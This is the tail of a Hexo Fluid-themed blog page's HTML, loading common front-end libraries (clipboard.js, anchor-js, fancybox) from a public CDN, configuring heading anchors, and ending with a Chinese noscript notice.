  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
